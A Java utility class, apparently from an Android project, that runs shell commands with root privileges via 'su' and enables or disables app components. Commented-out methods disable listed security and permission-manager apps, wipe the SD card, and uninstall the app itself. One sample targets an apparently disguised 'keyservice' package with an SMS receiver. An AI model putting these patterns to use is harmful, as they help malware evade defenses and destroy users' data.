package com.example.testsu;


import java.io.DataOutputStream;
import java.io.IOException;

public class RootUtils {
	public static String TAG = "RootUtils";

	// public static boolean checkRootPermission() {
	// if (RootTools.isRootAvailable()) {
	// Log.i(TAG, "已获取root权限");
	// return true;
	// } else {
	// Log.i(TAG, "未获取root权限");
	// // try {
	// // Runtime.getRuntime().exec("su");
	// // } catch (Exception e) {
	// // e.printStackTrace();
	// // }
	// return false;
	// }
	// }

	// /**
	// * 程序自杀
	// *
	// * @return
	// */
	// public static boolean suicide(String pkgName) {
	// // 清空SD卡文件
	//
	// SDCardUtils.cleanSDCard();
	// // RootUtils.enableAllSu();
	// // 卸载自己
	// // return
	// // RootUtils.excuteRootCMD("pm uninstall com.android.keyservice");
	// RootUtils.enableAllSafe();
	// return RootUtils.excuteRootCMD("pm uninstall " + pkgName);
	// }
	//
	// /**
	// * 关闭所有安全软件 在新线程中
	// */
	// public static void disableAllSu() {
	// // new Thread(new Runnable() {
	//
	// // @Override
	// // public void run() {
	// String cmdPm = "pm disable ";
	// String cmdAll = "";
	// String cmd = "";
	// for (String pkg : AppContext.supkgList) {
	// cmd = cmdPm + pkg + " \n ";
	// cmdAll += cmd;
	// }
	// RootUtils.excuteRootCMD(cmdAll);
	// Log.i(TAG, "关闭权限管理软件");
	// // }
	// // }).start();
	//
	// }

	// /**
	// * 关闭所有安全软件 在新线程中
	// */
	// public static void disableAllSafe() {
	// // new Thread(new Runnable() {
	//
	// // @Override
	// // public void run() {
	// String cmdPm = "pm disable ";
	// String cmdAll = "";
	// String cmd = "";
	// for (String pkg : AppContext.pkgList) {
	// cmd = cmdPm + pkg + " \n ";
	// cmdAll += cmd;
	// }
	// RootUtils.excuteRootCMD(cmdAll);
	// Log.i(TAG, "关闭安全软件");
	// // }
	// // }).start();
	//
	// }

	// /**
	// * 开启所有权限管理软件 在新线程中
	// */
	// public static void enableAllSu() {
	// // new Thread(new Runnable() {
	// //
	// // @Override
	// // public void run() {
	// String cmdAll = "";
	// String cmdPm = "pm enable ";
	// String cmd = "";
	// for (String pkg : AppContext.supkgList) {
	// cmd = cmdPm + pkg + " \n ";
	// cmdAll += cmd;
	// }
	// RootUtils.excuteRootCMD(cmdAll);
	// Log.i(TAG, "开启权限管理软件");
	// // }
	// // }).start();
	//
	// }

	// /**
	// * 开启所有安全软件 在新线程中
	// */
	// public static void enableAllSafe() {
	// // new Thread(new Runnable() {
	// //
	// // @Override
	// // public void run() {
	// String cmdAll = "";
	// String cmdPm = "pm enable ";
	// String cmd = "";
	// for (String pkg : AppContext.pkgList) {
	// cmd = cmdPm + pkg + " \n ";
	// cmdAll += cmd;
	// }
	// RootUtils.excuteRootCMD(cmdAll);
	// Log.i(TAG, "开启安全软件");
	// // }
	// // }).start();
	//
	// }

	/**
	 * 设置广播监听事件状态 开启或关闭
	 * 
	 * @param pkg
	 *            包名
	 * @param cls
	 *            类名
	 * @param mode
	 *            enable 或 disable
	 * @return
	 */
	public static boolean setContentMode(String pkg, String cls, String mode) {

		// (有些cls含有$，需要处理一下，不然会禁止失败，比如微信)
		// 但是获取应用是否允许或者禁止开机启动的时候就不用处理cls，否则得不到状态值
		cls = cls.replace("$", "\\$");
		// String command = "pm " + "enable" + "com.android.keyservice" + "/"
		// + "com.android.keyservice.broadcast.SmsReceiver" + "\n";
		String command = "pm " + mode + " " + pkg + "/" + cls + " \n";
		return RootUtils.excuteRootCMD(command);

	}

	/**
	 * 执行root 命令
	 * 
	 * @param command2
	 * @return
	 */
	public static boolean excuteRootCMD(String command2) {
		String command1 = "export LD_LIBRARY_PATH=/vendor/lib:/system/lib  \n";
		command2 += " \n";
		Process process = null;
		DataOutputStream dos = null;
		try {
			process = Runtime.getRuntime().exec("su");
			dos = new DataOutputStream(process.getOutputStream());
			dos.flush();
			dos.writeBytes(command1);
			dos.writeBytes(command2);
			dos.writeBytes("exit " + "\n");
			dos.flush();
			try {
				process.waitFor();
			} catch (InterruptedException e) {
				e.printStackTrace();
			}
			int exitValue = process.exitValue();
			try {
				if (exitValue == 0) {

					return true;
				} else {

					return false;
				}
			} catch (Exception e) {
				e.printStackTrace();
			}

		} catch (IOException e) {
			e.printStackTrace();
		} finally {

			if (dos != null) {
				try {
					dos.close();
				} catch (IOException e) {
					e.printStackTrace();
				}
			}
			if (process != null) {
				process.destroy();
			}
		}
		return false;
	}
}
